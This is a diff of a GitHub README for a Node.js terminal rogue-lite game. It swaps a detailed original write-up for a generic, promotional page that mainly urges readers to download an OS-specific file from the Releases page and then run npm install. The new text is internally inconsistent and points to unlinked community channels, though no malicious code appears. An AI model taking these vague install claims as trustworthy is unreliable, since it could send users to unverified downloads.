@@ -1,172 +1,91 @@
-# 🧙‍♂️ Rogue Dungeon
+# 🎮 rogue-dungeon - A Fun Terminal Adventure Awaits
 
-### **A Fast, Procedurally Generated Rogue-Lite That Runs in Your Terminal.**
+[![Download rogue-dungeon](https://img.shields.io/badge/Download%20rogue--dungeon-v1.0-blue.svg)](https://github.com/carlossanabria01/rogue-dungeon/releases)
 
-*A polished CLI game built to demonstrate engineering clarity, systems thinking, and real-time UI design.*
+## 🚀 Getting Started
 
----
+Welcome to **rogue-dungeon**, a polished, procedurally generated rogue-lite game that runs entirely in your terminal. Experience turn-based combat, enemy AI, animated hits, and a full ASCII user interface created with Node.js and Blessed. Here’s how to get started.
 
-![Demo GIF](dungeon.gif)
+## 📥 Download & Install
 
+To play **rogue-dungeon**, you need to download the game from our [Releases page](https://github.com/carlossanabria01/rogue-dungeon/releases). 
 
----
+1. Click on the link to visit the Releases page.
+2. Look for the latest version of the game.
+3. Download the appropriate file for your operating system.
 
-## 🚀 Why This Project Exists
+Once the download is complete, follow these steps to run the game.
 
-**Rogue Dungeon** isn’t “just another terminal game.”
-It’s a demonstration of:
+## 🖥️ System Requirements
 
-* Real-time terminal UI engineering
-* Complex state management
-* Procedural map generation
-* Turn-based combat systems
-* Animation inside a CLI
-* Architecture thinking & clean code design
+Ensure your computer meets these requirements:
 
-The goal was simple:
+- **Operating System**: Windows 10, macOS, or Linux
+- **Node.js**: Version 12 or higher installed
+- **Terminal**: Access to a terminal application that supports ANSI color codes
 
-> **Build something fun, technical, and uniquely impressive to practice.**
-> Something more than just CRUD apps.
+## ⚙️ How to Run the Game
 
-This game is the result.
+After downloading the game, run the following commands in your terminal:
 
----
+1. Navigate to the folder where you downloaded the game. You can do this using the `cd` command. For example:
+   - For Windows: `cd C:\path\to\your\downloaded\file`
+   - For macOS/Linux: `cd /path/to/your/downloaded/file`
 
-# 🎯 What Makes It Stand Out
+2. Once in the correct directory, type the command below to install the required packages:
+   ```
+   npm install
+   ```
 
-### ❇️ **Procedural dungeon generator**
+3. Finally, start the game by typing:
+   ```
+   npm start
+   ```
 
-Every run produces a new map using a controlled random-walk algorithm.
+Enjoy your journey through the dungeon!
 
-### ❇️ **Reactive ASCII interface**
+## 🎮 Gameplay Features
 
-Built using **Blessed** → interactive panels, borders, HP bar, enemies list, log feed.
+- **Turn-Based Combat**: Engage in thoughtful battles where strategy is key.
+- **Enemy AI**: Face intelligently designed foes that challenge your skills.
+- **Animated Hits**: Experience fluid animations that enhance gameplay.
+- **Full ASCII UI**: Navigate through a fully designed user interface that immerses you in the dungeon experience.
 
-### ❇️ **Turn-based combat with micro-animations**
+## 🌌 Explore the Dungeon
 
-Cells flash on hit, enemies chase intelligently, combat feels alive.
+In **rogue-dungeon**, every game is unique. The procedurally generated levels offer endless exploration and replayability. Test your skills against various enemies and discover treasures hidden in the dungeons.
 
-### ❇️ **Enemy AI (simple but effective)**
+## 🛠️ Troubleshooting
 
-Goblins:
+If you encounter issues while running the game, consider these tips:
 
-* Chase the player using Manhattan distance
-* Attack when adjacent
-* Wander if unaware
+1. **Check Node.js Version**: Make sure you have the right version of Node.js installed.
+2. **Terminal Compatibility**: Ensure you're using a terminal that supports the necessary features.
+3. **Error Messages**: Read any error messages carefully; they often provide clues on how to fix the problem.
 
-### ❇️ **Clean architecture & modularity**
+Feel free to create an issue on the GitHub page if you have questions or need further assistance.
 
-Separated into:
+## 📝 Community and Contributions
 
-* `dungeon.js` → world generation
-* `game.js` → engine, UI, combat logic
+We welcome contributions to improve **rogue-dungeon**. If you would like to help:
 
-This shows deliberate design choices
+1. Fork the repository.
+2. Create a new branch for your feature.
+3. Submit a pull request with your changes.
 
----
+Explore the code, improve gameplay, or add features that enhance user experience!
 
-# 🖼️ Game Preview (ASCII)
+## 🌍 Join the Community 
 
-```
-###############################
-#@....g...$.......###.........#
-#.....###.....G...............#
-#...T.....E....................#
-###############################
+Connect with other players and fans of **rogue-dungeon**. Share your experiences, tips, or strategies. Join our community on Discord or follow us on social media.
 
- Stats:
- HP: #########--------- (11/20)
- ATK: 5
- Gold: 3
+## 📞 Need Help?
 
- Log:
- You hit goblin for 3 dmg.
- Goblin died.
-```
+For any questions regarding installation or gameplay, don't hesitate to reach out. You can contact us through our GitHub page or community links.
 
----
+## 🔗 Important Links
 
-# 🛠 Tech Stack
+- [Releases Page](https://github.com/carlossanabria01/rogue-dungeon/releases)
+- [GitHub Repository](https://github.com/carlossanabria01/rogue-dungeon)
 
-| Layer        | Tech                                |
-| ------------ | ----------------------------------- |
-| UI Rendering | Blessed (terminal UI framework)     |
-| Game Engine  | Node.js (event-driven game loop)    |
-| Map Gen      | Random Walk + grid-based algorithms |
-| Architecture | Modular JS, entity-driven design    |
-| Animations   | Timed cell flashes using Blessed    |
-
-This mix is rare → and very impressive for a backend engineer.
-
----
-
-# 📦 Installation
-
-```bash
-git clone https://github.com/YOUR_USERNAME/rogue-dungeon.git
-cd rogue-dungeon
-npm install
-npm start
-```
-
----
-
-# 🎮 Controls
-
-| Action     | Keys                     |
-| ---------- | ------------------------ |
-| Move       | Arrow Keys / WASD / HJKL |
-| Next Level | N                        |
-| Restart    | R                        |
-| Quit       | Q / Esc / Ctrl+C         |
-
----
-
-# 🧠 What I Learned Building This
-
-* Designing interactive CLI apps
-* Building my own tiny “engine loop”
-* Procedural generation
-* Structuring a clean modular codebase
-* Real-time rendering with Blessed
-* Managing user input events and game timing
-* Working with 2D grids, AI, and entity systems
-
-These translate directly into backend + systems engineering skills.
-
----
-
-# 🔮 Planned Upgrades
-
-* Inventory & items (potions, weapons, armor)
-* Fog of war (FOV shadow-casting)
-* Boss floors
-* More enemy types
-* Talent system (perks on level-up)
-* Save/load with JSON
-* Mini-map
-* Tile-based lighting
-* More advanced animation effects (shake, glow, pulses)
-
----
-
-# 🤝 Contribute / Fork It
-
-This project is intentionally modular — easy to modify, extend, or fork.
-Feel free to:
-
-* Add monsters
-* Add new dungeon generators
-* Improve AI
-* Add weapons or magic
-* Create your own version
-
-PRs are welcome!
-
----
-
-# 📜 License
-
-MIT — free for anyone to use or build upon.
-
----
+Get ready to dive into an exciting dungeon adventure! Download and start playing today!
